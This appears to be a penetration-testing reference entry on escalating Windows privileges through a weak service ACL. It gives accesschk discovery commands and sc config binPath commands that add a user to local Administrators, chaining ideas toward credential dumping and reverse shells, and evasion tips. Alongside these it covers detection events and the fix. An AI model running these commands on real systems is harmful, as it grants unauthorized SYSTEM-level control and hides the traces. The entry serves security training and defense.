examples.label: Rewrite binPath to add yourself to admins
examples.command: sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

examples.label: Restart the service to trigger it
examples.command: sc stop WindscribeService && sc start WindscribeService

notes:
=== Weak Service ACL — Binary Path Reconfiguration via SCM ===
Low-privilege user holds write access on the service object itself in SCM — reconfigure binPath.

=== DIFFERENCE FROM BINARY ACL WEAKNESS ===
Binary ACL weakness: write access to the service BINARY FILE itself
Service ACL weakness: write access to the SERVICE OBJECT in Service Control Manager
Service object weakness allows reconfiguring binPath without touching or having access to the actual binary file.

=== DISCOVERY ===
  accesschk.exe /accepteula -quvcw <username> <ServiceName>
  accesschk.exe /accepteula -uwcqv "Authenticated Users" *   (sweep all services)
  Flags: -q suppress banner, -u suppress errors, -v verbose, -c service by name, -w writable only
  Look for: SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG for low-privilege principals

=== ATTACK FLOW ===
1. Find vulnerable service:
   accesschk.exe -uwcqv "NT AUTHORITY\Authenticated Users" *
   Or: accesschk.exe -uwcqv "BUILTIN\Users" *

2. Note original binPath (for cleanup):
   sc qc <ServiceName>

3. Modify binary path to attacker command:
   sc config <ServiceName> binpath= "cmd /c net localgroup administrators <user> /add"
   (cmd /c required — net.exe must be shell-invoked)

4. Trigger execution:
   sc stop <ServiceName>
   sc start <ServiceName>
   → StartService FAILED 1053 is EXPECTED and harmless — command ran before timeout

5. Verify:
   net localgroup administrators

6. Cleanup (restore original binPath):
   sc config <ServiceName> binpath= "C:\original\path\service.exe"
   sc start <ServiceName>

=== CHAINING CONTEXT ===
Weak service ACL → add to local admins → secretsdump → domain hashes
Weak service ACL → binPath = reverse shell → SYSTEM → lateral movement
Common in environments where custom service installers misconfigure the SCM DACL
sc.exe is built-in → zero tool footprint

=== WHAT TO LOOK FOR ===
NT AUTHORITY\Authenticated Users with SERVICE_ALL_ACCESS = any domain user can exploit
BUILTIN\Users or specific user accounts with write on service objects
Check all services, not just running ones — stopped services can be started and exploited

recommended.note: Overwrite the binary if you can't change config.

name: Weak Permissions - Reconfigure Service binPath
command: sc config <service> binpath="cmd /c net localgroup administrators <user> /add"
description: If your user has SERVICE_CHANGE_CONFIG on a service (accesschk -quvcw), change its binPath to a command that adds you to Administrators, restart the service, then restore the original path.

defense.why_it_works: The Service Control Manager (SCM) maintains access control on service objects themselves. If a service's SCM DACL grants SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS to non-admin users (discovered via accesschk), those users can modify the service binary path with `sc config binPath=` to an arbitrary command, then start the service to execute that command in the service account's context.
defense.prerequisites: SERVICE_CHANGE_CONFIG (or SERVICE_ALL_ACCESS) granted to a non-admin group on the target service. sc.exe access. Service must be startable.
defense.impact: Arbitrary command execution as the service account (often SYSTEM) by modifying the service binary path and starting the service.
defense.detection: sc config on a service by standard user (with SERVICE_CHANGE_CONFIG). Service binary path change logged (Event 7040). accesschk on services by standard user. Unusual binary path (cmd.exe or PowerShell) set for a service. sc start following sc config by non-admin.
defense.artifacts: System event 7040: service configuration changed | Process: sc.exe config by standard user | Sysmon Event 1: service executable changed to cmd.exe | Service started with unusual command as SYSTEM
defense.prevention: Audit service SCM DACLs. Default services should only grant SYSTEM and Administrators SERVICE_CHANGE_CONFIG. Custom application services often misconfigure this. Run accesschk.exe and fix any non-admin write access.
defense.misconfiguration: Application installer grants Everyone or BUILTIN\Users SERVICE_CHANGE_CONFIG on a service that runs as SYSTEM. No monitoring on service binary path changes.
defense.vulnerable_config:
# Service SCM DACL grants non-admin SERVICE_CHANGE_CONFIG:
accesschk.exe /accepteula -quvcw daclsvc
# BUILTIN\Users: SERVICE_CHANGE_CONFIG

# Exploit:
sc config daclsvc binPath= 'net localgroup Administrators attacker /add'
sc start daclsvc
# Executes net localgroup as SYSTEM
defense.secure_config:
# Audit service DACLs:
accesschk.exe -cquv daclsvc

# Fix: use sc sdset to restrict DACL:
# Or via PowerShell:
$sddl = sc.exe sdshow daclsvc
# Remove 'RP WP RC DT LO CR' for non-admin groups
sc.exe sdset daclsvc 'D:(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;BA)'

# Monitor: service config changes (Event 7040)
defense.evasion: Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service.
